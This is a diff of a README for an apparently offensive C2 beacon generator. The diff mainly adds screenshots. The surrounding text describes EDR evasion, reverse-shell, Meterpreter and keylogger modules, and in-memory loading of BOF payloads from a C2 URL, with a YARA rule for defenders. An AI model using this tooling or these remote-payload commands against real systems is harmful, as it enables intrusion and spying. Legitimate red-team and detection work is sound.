@@ -11,12 +11,16 @@
 
 > ⚠️ This project is released under GPLv3. See the DISCLAIMER section for full legal terms. 
 
+<img width="1712" height="859" alt="image" src="https://github.com/user-attachments/assets/74a13d86-3d7e-4207-a4bd-4231df9e3ea0" />
+
+
 ## 🔍 Overview
 beacon-GEN is a next-generation Bash-based configuration engine designed to generate highly customizable, stealthy C2 beacons for offensive operations. Built as the core orchestration layer of the LazyOwn RedTeam framework, it enables red teams to dynamically configure malleable C2 profiles, AES-256 encrypted communication, multi-UA rotation, and client-side persistence logic — all through a clean, CLI-driven interface.
 
 This script generates the foundational configuration for advanced implants that leverage, APC injection, and anti-analysis routines to evade modern EDR solutions.
 
 Intended for ethical hacking, penetration testing, and academic research, this tool supports seamless integration into automated attack chains and red team infrastructure.
+<img width="735" height="994" alt="image" src="https://github.com/user-attachments/assets/2cecaa04-2720-4e7f-9a7a-42e77f14f700" />
 
 
 ## For RedTeamers
@@ -37,6 +41,9 @@ Intended for ethical hacking, penetration testing, and academic research, this t
   --user-agent3 "BotNet-X/2.5" \
   --output hellbird.exe
 ```
+<img width="1438" height="921" alt="image" src="https://github.com/user-attachments/assets/3a724561-230f-462a-bcc4-50bf7da76012" />
+
+
 ## For BlueTeamers
 
 ```yara
@@ -117,11 +124,18 @@ rule hellbird_Runtime_Behavior {
 
 ## 🔥 Modules
 This beacon have load_module command you need pass a url to an dll module, for now we have 5 modules, revshell, Metasploit meterpreter, Keylogger, Stealth Command and Screenshot.
+
+<img width="1025" height="893" alt="image" src="https://github.com/user-attachments/assets/74e70f1d-4908-4483-af30-860a60c9bbd7" />
+
+
 - **Reverse Shell** : gen_dll_rev.sh
 - **Metasploit Meterpreter**: gen_dll.sh
 - **Screenshot**: gen_dll_ss.sh
 - **Keylogger**: gen_key.sh
 - **Stealth Command**: gen_module.sh
+
+<img width="1697" height="516" alt="image" src="https://github.com/user-attachments/assets/14c62e2a-321d-4996-b2c0-98a165499f1e" />
+
 
 ## 🚀 Feature: bof: — Execute COFF BOF Objects In-Memory (Cobalt Strike Style)
 
@@ -130,6 +144,9 @@ This beacon have load_module command you need pass a url to an dll module, for n
 Evade EDR/AV detection by loading and executing position-independent BOF (Binary Object File) payloads directly from a remote URL — without touching disk, without LoadLibrary, and without traditional PE loaders. 
 
 This feature is inspired by — but goes beyond — industry-standard tools like TrustedSec’s COFFLoader and CoffeeLdr . It’s engineered for stealth, reliability, and deep Windows internals compliance.
+
+<img width="1710" height="602" alt="image" src="https://github.com/user-attachments/assets/99a5a560-8926-4743-af7c-99b46ef9129e" />
+
 
 ### 🎯 How It Works — The Engineering Breakdown
 1. Command Syntax
@@ -143,6 +160,8 @@ bof:http://your-c2.com/payload.x64.o [optional_args]
 - Applies x64 relocations (ADDR64, REL32, REL32_1-5, etc.) with trampoline generation for out-of-range jumps.
 - Resolves external symbols (e.g., BeaconPrintf, GetModuleHandleA, CoInitializeEx) via a precomputed DJB2 hash table.
 - Executes the target function (usually go) with aligned stack and proper calling convention (ms_abi).
+<img width="768" height="992" alt="image" src="https://github.com/user-attachments/assets/a1732ce6-2910-4ae4-9c68-9aea15a70d38" />
+
 
 ### 2. Why COFF?
 
@@ -153,6 +172,8 @@ bof:http://your-c2.com/payload.x64.o [optional_args]
 
 ### 3. Symbol Resolution — The Heart of the System
 Your BOF doesn’t call GetModuleHandleA directly — it calls __imp_GetModuleHandleA, a thunk pointer that must be patched at load time.
+
+<img width="856" height="981" alt="image" src="https://github.com/user-attachments/assets/b3d7279b-092a-48b4-90b5-1b82a7b6d424" />
 
 ### ✅ Our loader does this correctly by:
 
@@ -232,6 +253,11 @@ bof:http://localhost:8080/mybof.x64.o "Hello World"
 **whoami.c**: Retrieves current username and computer name — perfect for testing symbol resolution.
 **Test.c**:  Test BOF to start develops or test the loader.
 
+<img width="1682" height="699" alt="image" src="https://github.com/user-attachments/assets/781cddd4-e3f6-4f3b-b032-dda2b82962a5" />
+<img width="877" height="762" alt="image" src="https://github.com/user-attachments/assets/f1e3259d-8695-4885-96f8-e005aadce6ee" />
+<img width="1710" height="731" alt="image" src="https://github.com/user-attachments/assets/af25330a-005c-4a19-9d53-8bd7a59c21ce" />
+
+
 ### 🧠 generate_hashes.py — The Symbol Hash Generator
 > Automatically regenerates the g_symbol_table[] in COFFLoader.c to ensure 100% symbol resolution accuracy for your BOFs. 
 
@@ -262,6 +288,7 @@ def djb2(s):
         h = ((h << 5) + h) + ord(c)  # h * 33 + c
     return h & 0xFFFFFFFF             # Ensure 32-bit result
 ```
+<img width="1703" height="271" alt="image" src="https://github.com/user-attachments/assets/a4c260a1-922e-4859-b7ab-5b1d03bbdc7e" />
 
 2. The Symbol List
 The imp_functions list contains every external symbol your BOFs might need. It includes:
